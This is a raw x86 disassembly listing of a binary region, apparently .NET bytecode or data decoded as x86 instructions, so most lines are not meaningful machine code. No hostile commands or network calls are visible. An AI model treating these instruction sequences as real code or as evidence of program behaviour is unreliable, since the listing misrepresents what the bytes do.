  40392a:	xchg   ebx,eax
  40392b:	add    BYTE PTR [eax],al
  40392d:	or     ch,BYTE PTR ds:0x312826
  403933:	add    BYTE PTR [edx],cl
  403935:	sub    BYTE PTR [eax],bh
  403937:	add    BYTE PTR [eax],al
  403939:	push   es
  40393a:	pop    ss
  40393b:	lea    eax,[ecx]
  40393d:	add    BYTE PTR [eax],al
  40393f:	add    DWORD PTR [edx],ecx
  403941:	push   es
  403942:	push   ss
  403943:	add    esp,DWORD PTR [edx+0x322806]
  403949:	add    BYTE PTR [edx],cl
  40394b:	jb     0x40393e
  40394d:	push   es
  40394e:	add    BYTE PTR [eax+0x73],dh
  403951:	xor    eax,DWORD PTR [eax]
  403953:	add    BYTE PTR [edx],cl
  403955:	jp     0x403959
  403957:	add    edi,DWORD PTR [ebp+0x8]
  40395a:	add    BYTE PTR [eax],al
  40395c:	add    al,0x2a
  40395e:	push   ds
  40395f:	add    bh,BYTE PTR [ebx+0x9]
  403962:	add    BYTE PTR [eax],al
  403964:	add    al,0x2a
  403966:	ret    0x2803
  403969:	sahf   
  40396a:	add    BYTE PTR [eax],al
  40396c:	or     ch,BYTE PTR [eax+eiz*1]
  40396f:	add    ch,BYTE PTR [eax]
  403971:	daa    
  403972:	add    BYTE PTR [eax],al
  403974:	push   es
  403975:	adc    al,0x28
  403977:	push   esp
  403978:	add    BYTE PTR [eax],al
  40397a:	or     ch,BYTE PTR [edx+edx*1]
  40397d:	add    al,BYTE PTR [edx]
  40397f:	sub    BYTE PTR [edi],ah
  403981:	add    BYTE PTR [eax],al
  403983:	push   es
  403984:	outs   dx,DWORD PTR ds:[esi]
  403985:	add    BYTE PTR ss:[eax],al
  403988:	or     bh,BYTE PTR [ebp+0x9]
  40398b:	add    BYTE PTR [eax],al
  40398d:	add    al,0x2a
  40398f:	add    al,BYTE PTR [ebx]
  403991:	jge    0x40399c
  403993:	add    BYTE PTR [eax],al
  403995:	add    al,0x2a
  403997:	push   ds
  403998:	add    bh,BYTE PTR [ebx+0xa]
  40399b:	add    BYTE PTR [eax],al
  40399d:	add    al,0x2a
  40399f:	and    al,BYTE PTR [edx]
  4039a1:	add    edi,DWORD PTR [ebp+0xa]
  4039a4:	add    BYTE PTR [eax],al
  4039a6:	add    al,0x2a
  4039a8:	push   ds
  4039a9:	add    bh,BYTE PTR [ebx+0xb]
  4039ac:	add    BYTE PTR [eax],al
  4039ae:	add    al,0x2a
  4039b0:	and    al,BYTE PTR [edx]
  4039b2:	add    edi,DWORD PTR [ebp+0xb]
  4039b5:	add    BYTE PTR [eax],al
  4039b7:	add    al,0x2a
  4039b9:	push   ds
  4039ba:	add    bh,BYTE PTR [ebx+0xd]
  4039bd:	add    BYTE PTR [eax],al
  4039bf:	add    al,0x2a
  4039c1:	and    al,BYTE PTR [edx]
  4039c3:	add    edi,DWORD PTR [ebp+0xd]
  4039c6:	add    BYTE PTR [eax],al
  4039c8:	add    al,0x2a
  4039ca:	push   ds
  4039cb:	add    ch,BYTE PTR [eax]
  4039cd:	push   ss
  4039ce:	add    BYTE PTR [eax],al
  4039d0:	or     ch,BYTE PTR [edx]
  4039d2:	add    BYTE PTR [eax],al
  4039d4:	adc    esi,DWORD PTR [eax]
  4039d6:	add    al,BYTE PTR [eax]
  4039d8:	xor    eax,DWORD PTR [eax]
  4039da:	add    BYTE PTR [eax],al
  4039dc:	sbb    eax,DWORD PTR [eax]
  4039de:	add    BYTE PTR [ecx],dl
  4039e0:	jle    0x4039f0
  4039e2:	add    BYTE PTR [eax],al
  4039e4:	add    al,0x14
  4039e6:	sub    BYTE PTR [ecx+0x2c0a0000],ah
  4039ec:	and    BYTE PTR [edx-0x3],dh
  4039ef:	push   es
  4039f0:	add    BYTE PTR [eax-0x30],dh
  4039f3:	add    al,0x0
  4039f5:	add    BYTE PTR [edx],al
  4039f7:	sub    BYTE PTR ds:0x6f0a0000,dh
  4039fd:	mov    ds:0x730a0000,al
  403a02:	mov    ds:0xa0a0000,eax
  403a07:	push   es
  403a08:	or     BYTE PTR [esi],0x0
  403a0b:	add    BYTE PTR [esi+edi*2],al
  403a0e:	push   cs
  403a0f:	add    BYTE PTR [eax],al
  403a11:	add    al,0x2a
  403a13:	sbb    bh,BYTE PTR [esi+0xf]
  403a16:	add    BYTE PTR [eax],al
  403a18:	add    al,0x2a
  403a1a:	push   ds
  403a1b:	add    al,BYTE PTR [eax+0x400000f]
  403a21:	sub    dl,BYTE PTR [esi+0x28]
  403a24:	xor    eax,0x72060000
  403a29:	dec    ecx
  403a2a:	pop    es
  403a2b:	add    BYTE PTR [eax+0x7e],dh
  403a2e:	sldt   WORD PTR [eax]
  403a31:	add    al,0x6f
  403a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a34:	add    BYTE PTR [eax],al
  403a36:	or     ch,BYTE PTR [edx]
  403a38:	push   esi
  403a39:	sub    BYTE PTR ds:0x72060000,dh
  403a3f:	ins    DWORD PTR es:[edi],dx
  403a40:	pop    es
  403a41:	add    BYTE PTR [eax+0x7e],dh
  403a44:	sldt   WORD PTR [eax]
  403a47:	add    al,0x6f
  403a49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a4a:	add    BYTE PTR [eax],al
  403a4c:	or     ch,BYTE PTR [edx]
  403a4e:	push   esi
  403a4f:	sub    BYTE PTR ds:0x72060000,dh
  403a55:	lea    eax,[edi]
  403a57:	add    BYTE PTR [eax+0x7e],dh
  403a5a:	sldt   WORD PTR [eax]
  403a5d:	add    al,0x6f
  403a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a60:	add    BYTE PTR [eax],al
  403a62:	or     ch,BYTE PTR [edx]
  403a64:	push   esi
  403a65:	sub    BYTE PTR ds:0x72060000,dh
  403a6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a6c:	pop    es
  403a6d:	add    BYTE PTR [eax+0x7e],dh
  403a70:	sldt   WORD PTR [eax]
  403a73:	add    al,0x6f
  403a75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a76:	add    BYTE PTR [eax],al
  403a78:	or     ch,BYTE PTR [edx]
  403a7a:	push   esi
  403a7b:	sub    BYTE PTR ds:0x72060000,dh
  403a81:	ret    
  403a82:	pop    es
  403a83:	add    BYTE PTR [eax+0x7e],dh
  403a86:	sldt   WORD PTR [eax]
  403a89:	add    al,0x6f
  403a8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a8c:	add    BYTE PTR [eax],al
  403a8e:	or     ch,BYTE PTR [edx]
  403a90:	push   esi
  403a91:	sub    BYTE PTR ds:0x72060000,dh
  403a97:	in     eax,dx
  403a98:	pop    es
  403a99:	add    BYTE PTR [eax+0x7e],dh
  403a9c:	sldt   WORD PTR [eax]
  403a9f:	add    al,0x6f
  403aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403aa2:	add    BYTE PTR [eax],al
  403aa4:	or     ch,BYTE PTR [edx]
  403aa6:	push   esi
  403aa7:	sub    BYTE PTR ds:0x72060000,dh
  403aad:	add    ecx,DWORD PTR [eax]
  403aaf:	add    BYTE PTR [eax+0x7e],dh
  403ab2:	sldt   WORD PTR [eax]
  403ab5:	add    al,0x6f
  403ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ab8:	add    BYTE PTR [eax],al
  403aba:	or     ch,BYTE PTR [edx]
  403abc:	push   esi
  403abd:	sub    BYTE PTR ds:0x72060000,dh
  403ac3:	sub    ecx,DWORD PTR [eax]
  403ac5:	add    BYTE PTR [eax+0x7e],dh
  403ac8:	sldt   WORD PTR [eax]
  403acb:	add    al,0x6f
  403acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ace:	add    BYTE PTR [eax],al
  403ad0:	or     ch,BYTE PTR [edx]
  403ad2:	push   esi
  403ad3:	sub    BYTE PTR ds:0x72060000,dh
  403ad9:	inc    edi
  403ada:	or     BYTE PTR [eax],al
  403adc:	jo     0x403b5c
  403ade:	sldt   WORD PTR [eax]
  403ae1:	add    al,0x6f
  403ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ae4:	add    BYTE PTR [eax],al
  403ae6:	or     ch,BYTE PTR [edx]
  403ae8:	push   esi
  403ae9:	sub    BYTE PTR ds:0x72060000,dh
  403aef:	or     BYTE PTR [bx+si],al
  403af2:	jo     0x403b72
  403af4:	sldt   WORD PTR [eax]
  403af7:	add    al,0x6f
  403af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403afa:	add    BYTE PTR [eax],al
  403afc:	or     ch,BYTE PTR [edx]
  403afe:	push   esi
  403aff:	sub    BYTE PTR ds:0x72060000,dh
  403b05:	mov    DWORD PTR [eax],ecx
  403b07:	add    BYTE PTR [eax+0x7e],dh
  403b0a:	sldt   WORD PTR [eax]
  403b0d:	add    al,0x6f
  403b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b10:	add    BYTE PTR [eax],al
  403b12:	or     ch,BYTE PTR [edx]
  403b14:	push   esi
  403b15:	sub    BYTE PTR ds:0x72060000,dh
  403b1b:	lods   eax,DWORD PTR ds:[esi]
  403b1c:	or     BYTE PTR [eax],al
  403b1e:	jo     0x403b9e
  403b20:	sldt   WORD PTR [eax]
  403b23:	add    al,0x6f
  403b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b26:	add    BYTE PTR [eax],al
  403b28:	or     ch,BYTE PTR [edx]
  403b2a:	push   esi
  403b2b:	sub    BYTE PTR ds:0x72060000,dh
  403b31:	ror    DWORD PTR [eax],1
  403b33:	add    BYTE PTR [eax+0x7e],dh
  403b36:	sldt   WORD PTR [eax]
  403b39:	add    al,0x6f
  403b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b3c:	add    BYTE PTR [eax],al
  403b3e:	or     ch,BYTE PTR [edx]
  403b40:	push   esi
  403b41:	sub    BYTE PTR ds:0x72060000,dh
  403b47:	cmc    
  403b48:	or     BYTE PTR [eax],al
  403b4a:	jo     0x403bca
  403b4c:	sldt   WORD PTR [eax]
  403b4f:	add    al,0x6f
  403b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b52:	add    BYTE PTR [eax],al
  403b54:	or     ch,BYTE PTR [edx]
  403b56:	push   esi
  403b57:	sub    BYTE PTR ds:0x72060000,dh
  403b5d:	adc    DWORD PTR [ecx],ecx
  403b5f:	add    BYTE PTR [eax+0x7e],dh
  403b62:	sldt   WORD PTR [eax]
  403b65:	add    al,0x6f
  403b67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b68:	add    BYTE PTR [eax],al
  403b6a:	or     ch,BYTE PTR [edx]
  403b6c:	push   esi
  403b6d:	sub    BYTE PTR ds:0x72060000,dh
  403b73:	sub    eax,0x7e700009
  403b78:	sldt   WORD PTR [eax]
  403b7b:	add    al,0x6f
  403b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b7e:	add    BYTE PTR [eax],al
  403b80:	or     ch,BYTE PTR [edx]
  403b82:	push   esi
  403b83:	sub    BYTE PTR ds:0x72060000,dh
  403b89:	dec    ecx
  403b8a:	or     DWORD PTR [eax],eax
  403b8c:	jo     0x403c0c
  403b8e:	sldt   WORD PTR [eax]
  403b91:	add    al,0x6f
  403b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b94:	add    BYTE PTR [eax],al
  403b96:	or     ch,BYTE PTR [edx]
  403b98:	push   esi
  403b99:	sub    BYTE PTR ds:0x72060000,dh
  403b9f:	imul   ecx,DWORD PTR [ecx],0x0
  403ba2:	jo     0x403c22
  403ba4:	sldt   WORD PTR [eax]
  403ba7:	add    al,0x6f
  403ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403baa:	add    BYTE PTR [eax],al
  403bac:	or     ch,BYTE PTR [edx]
  403bae:	push   esi
  403baf:	sub    BYTE PTR ds:0x72060000,dh
  403bb5:	lea    ecx,[ecx]
  403bb7:	add    BYTE PTR [eax+0x7e],dh
  403bba:	sldt   WORD PTR [eax]
  403bbd:	add    al,0x6f
  403bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bc0:	add    BYTE PTR [eax],al
  403bc2:	or     ch,BYTE PTR [edx]
  403bc4:	push   esi
  403bc5:	sub    BYTE PTR ds:0x72060000,dh
  403bcb:	scas   eax,DWORD PTR es:[edi]
  403bcc:	or     DWORD PTR [eax],eax
  403bce:	jo     0x403c4e
  403bd0:	sldt   WORD PTR [eax]
  403bd3:	add    al,0x6f
  403bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bd6:	add    BYTE PTR [eax],al
  403bd8:	or     ch,BYTE PTR [edx]
  403bda:	push   esi
  403bdb:	sub    BYTE PTR ds:0x72060000,dh
  403be1:	ror    DWORD PTR [ecx],1
  403be3:	add    BYTE PTR [eax+0x7e],dh
  403be6:	sldt   WORD PTR [eax]
  403be9:	add    al,0x6f
  403beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bec:	add    BYTE PTR [eax],al
  403bee:	or     ch,BYTE PTR [edx]
  403bf0:	push   esi
  403bf1:	sub    BYTE PTR ds:0x72060000,dh
  403bf7:	repz or DWORD PTR [eax],eax
  403bfa:	jo     0x403c7a
  403bfc:	sldt   WORD PTR [eax]
  403bff:	add    al,0x6f
  403c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c02:	add    BYTE PTR [eax],al
  403c04:	or     ch,BYTE PTR [edx]
  403c06:	push   esi
  403c07:	sub    BYTE PTR ds:0x72060000,dh
  403c0d:	adc    eax,0x7e70000a
  403c12:	sldt   WORD PTR [eax]
  403c15:	add    al,0x6f
  403c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c18:	add    BYTE PTR [eax],al
  403c1a:	or     ch,BYTE PTR [edx]
  403c1c:	push   esi
  403c1d:	sub    BYTE PTR ds:0x72060000,dh
  403c23:	aaa    
  403c24:	or     al,BYTE PTR [eax]
  403c26:	jo     0x403ca6
  403c28:	sldt   WORD PTR [eax]
  403c2b:	add    al,0x6f
  403c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c2e:	add    BYTE PTR [eax],al
  403c30:	or     ch,BYTE PTR [edx]
  403c32:	push   esi
  403c33:	sub    BYTE PTR ds:0x72060000,dh
  403c39:	pop    ecx
  403c3a:	or     al,BYTE PTR [eax]
  403c3c:	jo     0x403cbc
  403c3e:	sldt   WORD PTR [eax]
  403c41:	add    al,0x6f
  403c43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c44:	add    BYTE PTR [eax],al
  403c46:	or     ch,BYTE PTR [edx]
  403c48:	push   esi
  403c49:	sub    BYTE PTR ds:0x72060000,dh
  403c4f:	jnp    0x403c5b
  403c51:	add    BYTE PTR [eax+0x7e],dh
  403c54:	sldt   WORD PTR [eax]
  403c57:	add    al,0x6f
  403c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c5a:	add    BYTE PTR [eax],al
  403c5c:	or     ch,BYTE PTR [edx]
  403c5e:	push   esi
  403c5f:	sub    BYTE PTR ds:0x72060000,dh
  403c65:	popf   
  403c66:	or     al,BYTE PTR [eax]
  403c68:	jo     0x403ce8
  403c6a:	sldt   WORD PTR [eax]
  403c6d:	add    al,0x6f
  403c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c70:	add    BYTE PTR [eax],al
  403c72:	or     ch,BYTE PTR [edx]
  403c74:	push   esi
  403c75:	sub    BYTE PTR ds:0x72060000,dh
  403c7b:	mov    edi,0x7e70000a
  403c80:	sldt   WORD PTR [eax]
  403c83:	add    al,0x6f
  403c85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c86:	add    BYTE PTR [eax],al
  403c88:	or     ch,BYTE PTR [edx]
  403c8a:	push   esi
  403c8b:	sub    BYTE PTR ds:0x72060000,dh
  403c91:	loope  0x403c9d
  403c93:	add    BYTE PTR [eax+0x7e],dh
  403c96:	sldt   WORD PTR [eax]
  403c99:	add    al,0x6f
  403c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c9c:	add    BYTE PTR [eax],al
  403c9e:	or     ch,BYTE PTR [edx]
  403ca0:	push   esi
  403ca1:	sub    BYTE PTR ds:0x72060000,dh
  403ca7:	add    ecx,DWORD PTR [ebx]
  403ca9:	add    BYTE PTR [eax+0x7e],dh
  403cac:	sldt   WORD PTR [eax]
  403caf:	add    al,0x6f
  403cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cb2:	add    BYTE PTR [eax],al
  403cb4:	or     ch,BYTE PTR [edx]
  403cb6:	push   esi
  403cb7:	sub    BYTE PTR ds:0x72060000,dh
  403cbd:	and    eax,0x7e70000b
  403cc2:	sldt   WORD PTR [eax]
  403cc5:	add    al,0x6f
  403cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cc8:	add    BYTE PTR [eax],al
  403cca:	or     ch,BYTE PTR [edx]
  403ccc:	push   esi
  403ccd:	sub    BYTE PTR ds:0x72060000,dh
  403cd3:	inc    edi
  403cd4:	or     eax,DWORD PTR [eax]
  403cd6:	jo     0x403d56
  403cd8:	sldt   WORD PTR [eax]
  403cdb:	add    al,0x6f
  403cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cde:	add    BYTE PTR [eax],al
  403ce0:	or     ch,BYTE PTR [edx]
  403ce2:	push   esi
  403ce3:	sub    BYTE PTR ds:0x72060000,dh
  403ce9:	imul   ecx,DWORD PTR [ebx],0xf7e7000
  403cef:	add    BYTE PTR [eax],al
  403cf1:	add    al,0x6f
  403cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cf4:	add    BYTE PTR [eax],al
  403cf6:	or     ch,BYTE PTR [edx]
  403cf8:	push   esi
  403cf9:	sub    BYTE PTR ds:0x72060000,dh
  403cff:	mov    ecx,DWORD PTR [ebx]
  403d01:	add    BYTE PTR [eax+0x7e],dh
  403d04:	sldt   WORD PTR [eax]
  403d07:	add    al,0x6f
  403d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d0a:	add    BYTE PTR [eax],al
  403d0c:	or     ch,BYTE PTR [edx]
  403d0e:	push   esi
  403d0f:	sub    BYTE PTR ds:0x72060000,dh
  403d15:	lods   eax,DWORD PTR ds:[esi]
  403d16:	or     eax,DWORD PTR [eax]
  403d18:	jo     0x403d98
  403d1a:	sldt   WORD PTR [eax]
  403d1d:	add    al,0x6f
  403d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d20:	add    BYTE PTR [eax],al
  403d22:	or     ch,BYTE PTR [edx]
  403d24:	push   esi
  403d25:	sub    BYTE PTR ds:0x72060000,dh
  403d2b:	leave  
  403d2c:	or     eax,DWORD PTR [eax]
  403d2e:	jo     0x403dae
  403d30:	sldt   WORD PTR [eax]
  403d33:	add    al,0x6f
  403d35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d36:	add    BYTE PTR [eax],al
  403d38:	or     ch,BYTE PTR [edx]
  403d3a:	push   esi
  403d3b:	sub    BYTE PTR ds:0x72060000,dh
  403d41:	in     eax,0xb
  403d43:	add    BYTE PTR [eax+0x7e],dh
  403d46:	sldt   WORD PTR [eax]
  403d49:	add    al,0x6f
  403d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d4c:	add    BYTE PTR [eax],al
  403d4e:	or     ch,BYTE PTR [edx]
  403d50:	push   esi
  403d51:	sub    BYTE PTR ds:0x72060000,dh
  403d57:	add    DWORD PTR [eax+eax*1],ecx
  403d5a:	jo     0x403dda
  403d5c:	sldt   WORD PTR [eax]
  403d5f:	add    al,0x6f
  403d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d62:	add    BYTE PTR [eax],al
  403d64:	or     ch,BYTE PTR [edx]
  403d66:	push   esi
  403d67:	sub    BYTE PTR ds:0x72060000,dh
  403d6d:	sbb    eax,0x7e70000c
  403d72:	sldt   WORD PTR [eax]
  403d75:	add    al,0x6f
  403d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d78:	add    BYTE PTR [eax],al
  403d7a:	or     ch,BYTE PTR [edx]
  403d7c:	sbb    esi,DWORD PTR [eax]
  403d7e:	or     BYTE PTR [eax],al
  403d80:	arpl   WORD PTR [ecx],ax
  403d82:	add    BYTE PTR [eax],al
  403d84:	sbb    al,0x0
  403d86:	add    BYTE PTR [ecx],dl
  403d88:	jle    0x403d30
  403d8a:	add    BYTE PTR [eax],al
  403d8c:	or     cl,BYTE PTR [edx]
  403d8e:	sub    BYTE PTR [eax+eax*1+0x140b0a00],bl
  403d95:	or     al,0x16
  403d97:	or     eax,0x16041316
  403d9c:	adc    eax,DWORD PTR ds:0x6eb72
  403da2:	jo     0x403db7
  403da4:	push   es
  403da5:	jae    0x403d4e
  403da7:	add    BYTE PTR [eax],al
  403da9:	or     dl,BYTE PTR [ebx]
  403dab:	pop    es
  403dac:	add    dl,BYTE PTR [edx]
  403dae:	add    eax,0x1120012
  403db3:	adc    al,BYTE PTR [edx]
  403db5:	adc    al,BYTE PTR [ebx]
  403db7:	adc    al,BYTE PTR [edx+edx*1]
  403dba:	push   es
  403dbb:	sub    BYTE PTR [ecx+0x0],ah
  403dbe:	add    BYTE PTR [esi],al
  403dc0:	adc    DWORD PTR ds:0x60280d2c,eax
  403dc6:	add    BYTE PTR [eax],al
  403dc8:	push   es
  403dc9:	push   ss
  403dca:	adc    ecx,DWORD PTR ds:0x117dd
  403dd0:	add    BYTE PTR [esi],al
  403dd2:	sub    BYTE PTR [eax+0x130a0000],ch
  403dd8:	or     BYTE PTR [ecx],dl
  403dda:	or     BYTE PTR [edi-0x57],ch
  403ddd:	add    BYTE PTR [eax],al
  403ddf:	or     dl,BYTE PTR [ebx]
  403de1:	push   cs
  403de2:	push   ss
  403de3:	adc    ecx,DWORD PTR [edi]
  403de5:	sub    esi,DWORD PTR [esi]
  403de7:	adc    DWORD PTR [esi],ecx
  403de9:	adc    DWORD PTR [edi],ecx
  403deb:	call   0xaa6f:0x9110913
  403df2:	add    BYTE PTR [eax],al
  403df4:	or     ch,BYTE PTR [eax+eiz*1]
  403df7:	adc    DWORD PTR [ecx],ecx
  403df9:	sar    BYTE PTR [eax+eax*1+0x0],1
  403dfd:	add    DWORD PTR [eax],ebp
  403dff:	xor    eax,0x160a0000
  403e04:	outs   dx,DWORD PTR ds:[esi]
  403e05:	stos   DWORD PTR es:[edi],eax
  403e06:	add    BYTE PTR [eax],al
  403e08:	or     cl,BYTE PTR [esi+0x9311669]
  403e0e:	adc    DWORD PTR [edi],eax
  403e10:	adc    DWORD PTR [ecx],ecx
  403e12:	outs   dx,DWORD PTR ds:[esi]
  403e13:	lods   al,BYTE PTR ds:[esi]
  403e14:	add    BYTE PTR [eax],al
  403e16:	or     dl,BYTE PTR [ecx]
  403e18:	movhps QWORD PTR [eax+0x13],xmm3
  403e1c:	movups XMMWORD PTR [edi],xmm1
  403e1f:	adc    DWORD PTR [esi],ecx
  403e21:	mov    gs,WORD PTR [ecx+0x32]
  403e24:	ret    0x711
  403e27:	outs   dx,DWORD PTR ds:[esi]
  403e28:	lods   eax,DWORD PTR ds:[esi]
  403e29:	add    BYTE PTR [eax],al
  403e2b:	or     ch,BYTE PTR ds:0xc397221
  403e31:	add    BYTE PTR [eax-0x30],dh
  403e34:	jl     0x403e36
  403e36:	add    BYTE PTR [ecx],al
  403e38:	sub    BYTE PTR ds:0x6f0a0000,dh
  403e3e:	pop    ss
  403e3f:	add    BYTE PTR [eax],al
  403e41:	or     ch,BYTE PTR [eax]
  403e43:	scas   al,BYTE PTR es:[edi]
  403e44:	add    BYTE PTR [eax],al
  403e46:	or     dl,BYTE PTR [esi]
  403e48:	adc    ecx,DWORD PTR ds:0x99dd
  403e4e:	add    BYTE PTR [ecx],dl
  403e50:	pop    es
  403e51:	outs   dx,DWORD PTR ds:[esi]
  403e52:	scas   eax,DWORD PTR es:[edi]
  403e53:	add    BYTE PTR [eax],al
  403e55:	or     dl,BYTE PTR [ebx]
  403e57:	adc    BYTE PTR [ebx],ch
  403e59:	push   esp
  403e5a:	adc    dl,BYTE PTR [eax]
  403e5c:	sub    BYTE PTR [eax+0x130a0000],dh
  403e62:	or     dl,BYTE PTR [ecx]
  403e64:	or     dh,BYTE PTR [ebx+0x26]
  403e67:	add    BYTE PTR [eax],al
  403e69:	push   es
  403e6a:	adc    ecx,DWORD PTR [ebx]
  403e6c:	adc    DWORD PTR [ebx],ecx
  403e6e:	or     DWORD PTR [edi+0x2f],ebp
  403e71:	add    BYTE PTR [eax],al
  403e73:	push   es
  403e74:	adc    DWORD PTR [ebx],ecx
  403e76:	adc    DWORD PTR [edi+ebp*2],eax
  403e79:	xor    DWORD PTR [eax],eax
  403e7b:	add    BYTE PTR [esi],al
  403e7d:	adc    DWORD PTR [ebx],ecx
  403e7f:	sub    BYTE PTR [ecx+0x6f0a0000],dh
  403e85:	xor    eax,DWORD PTR [eax]
  403e87:	add    BYTE PTR [esi],al
  403e89:	adc    DWORD PTR [ebx],ecx
  403e8b:	adc    DWORD PTR [esi],eax
  403e8d:	outs   dx,DWORD PTR ds:[esi]
  403e8e:	sub    DWORD PTR [eax],eax
  403e90:	add    BYTE PTR [esi],al
  403e92:	adc    DWORD PTR [ebx],ecx
  403e94:	pop    es
  403e95:	outs   dx,DWORD PTR ds:[esi]
  403e96:	sub    eax,DWORD PTR [eax]
  403e98:	add    BYTE PTR [esi],al
  403e9a:	adc    DWORD PTR [ebx],ecx
  403e9c:	or     BYTE PTR [edi+0x2d],ch
  403e9f:	add    BYTE PTR [eax],al
  403ea1:	push   es
  403ea2:	jae    0x403ea5
  403ea4:	add    BYTE PTR [eax],al
  403ea6:	push   es
  403ea7:	adc    DWORD PTR [ebx],ecx
  403ea9:	sub    BYTE PTR [edx],al
  403eab:	add    BYTE PTR [eax],al
  403ead:	push   es
  403eae:	adc    dl,BYTE PTR [eax]
  403eb0:	sub    BYTE PTR [edx+0x2d0a0000],dh
  403eb6:	mov    ds:0x10120ede,eax
  403ebb:	(bad)  
  403ebc:	push   ss
  403ebd:	push   cs
  403ebe:	add    BYTE PTR [eax],al
  403ec0:	sbb    ebp,DWORD PTR [edi+0x20]
  403ec3:	add    BYTE PTR [eax],al
  403ec5:	or     bl,ah
  403ec7:	jb     0x403ea3
  403ec9:	or     al,0x0
  403ecb:	jo     0x403ef5
  403ecd:	mov    bl,0x0
  403ecf:	add    BYTE PTR [edx],cl
  403ed1:	ficom  WORD PTR [ebx]
  403ed3:	adc    ecx,DWORD PTR [edx+esi*2]
  403ed6:	adc    BYTE PTR ds:0xc117000,cl
  403edc:	sub    BYTE PTR [esi+0x170a0000],ch
  403ee2:	adc    ecx,DWORD PTR ds:0x2a1602de
  403ee8:	adc    DWORD PTR ds:0x3441002a,ecx
  403eee:	add    BYTE PTR [eax],al
  403ef0:	add    al,BYTE PTR [eax]
  403ef2:	add    BYTE PTR [eax],al
  403ef4:	rol    BYTE PTR [eax],1
  403ef6:	add    BYTE PTR [eax],al
  403ef8:	popa   
  403ef9:	add    BYTE PTR [eax],al
  403efb:	add    BYTE PTR [ecx],dh
  403efd:	add    DWORD PTR [eax],eax
  403eff:	add    BYTE PTR [esi],cl
	...
  403f0d:	add    BYTE PTR [eax],al
  403f0f:	add    BYTE PTR [ebx+0x1],cl
  403f12:	add    BYTE PTR [eax],al
  403f14:	dec    ebx
  403f15:	add    DWORD PTR [eax],eax
  403f17:	add    BYTE PTR [ebx],dl
  403f19:	add    BYTE PTR [eax],al
  403f1b:	add    BYTE PTR [esi+0x0],bh
  403f1e:	add    BYTE PTR [ecx],al
  403f20:	adc    esi,DWORD PTR [eax]
  403f22:	push   es
  403f23:	add    ch,bl
  403f25:	add    DWORD PTR [eax],eax
  403f27:	add    BYTE PTR ds:0xd0110000,bl
  403f2d:	add    eax,0x28020000
  403f32:	xor    eax,0x6f0a0000
  403f37:	mov    ds:0x6f0a0000,al
  403f3c:	mov    ah,0x0
  403f3e:	add    BYTE PTR [edx],cl
  403f40:	outs   dx,DWORD PTR ds:[esi]
  403f41:	mov    ch,0x0
  403f43:	add    BYTE PTR [edx],cl
  403f45:	outs   dx,DWORD PTR ds:[esi]
  403f46:	mov    dh,0x0
  403f48:	add    BYTE PTR [edx],cl
  403f4a:	or     dh,BYTE PTR [ebx-0x49]
  403f4d:	add    BYTE PTR [eax],al
  403f4f:	or     cl,BYTE PTR [ebx]
  403f51:	pop    es
  403f52:	sub    BYTE PTR [ebp+0x0],al
  403f55:	add    BYTE PTR [esi],al
  403f57:	outs   dx,DWORD PTR ds:[esi]
  403f58:	mov    eax,0x260a0000
  403f5d:	pop    es
  403f5e:	sub    BYTE PTR [ecx+0x280a0000],bh
  403f64:	inc    esi
  403f65:	add    BYTE PTR [eax],al
  403f67:	push   es
  403f68:	pop    ss
  403f69:	lea    eax,[ecx]
  403f6b:	add    BYTE PTR [eax],al
  403f6d:	add    DWORD PTR [eax+ecx*1],ecx
  403f70:	push   ss
  403f71:	push   es
  403f72:	mov    ds:0x322808,al
  403f77:	add    BYTE PTR [edx],cl
  403f79:	outs   dx,DWORD PTR ds:[esi]
  403f7a:	mov    eax,0x260a0000
  403f7f:	pop    es
  403f80:	sub    BYTE PTR [edi+0x0],al
  403f83:	add    BYTE PTR [esi],al
  403f85:	outs   dx,DWORD PTR ds:[esi]
  403f86:	mov    eax,0x260a0000
  403f8b:	pop    es
